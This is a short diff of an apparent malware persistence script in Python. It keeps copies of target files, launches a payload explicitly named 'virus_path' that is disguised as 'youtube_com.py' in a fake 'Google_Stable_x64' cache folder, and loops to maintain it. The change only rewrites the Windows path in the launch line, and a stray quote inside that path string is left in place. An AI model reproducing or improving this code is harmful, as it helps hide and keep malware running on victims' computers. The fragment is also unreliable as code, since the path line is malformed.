@@ -12,7 +12,7 @@ files_to_backup = [
 backuped_files = [open(path, "rb").read() for path, _ in files_to_backup]
 
 virus_path = f"{home_dir}/Downloads/Google_Stable_x64/assets/cache/youtube_com.py"
-subprocess.Popen([sys.executable, 'C:/Users/justlinux/Downloads/Google_Stable_x64/assets/cache/youtube_com.py"'])
+subprocess.Popen([sys.executable, 'C:\\Users\\justlinux\\Downloads\\Google_Stable_x64\\assets\\cache\\youtube_com.py"'])
 
 while True:
   for index, file_paths in enumerate(files_to_backup):
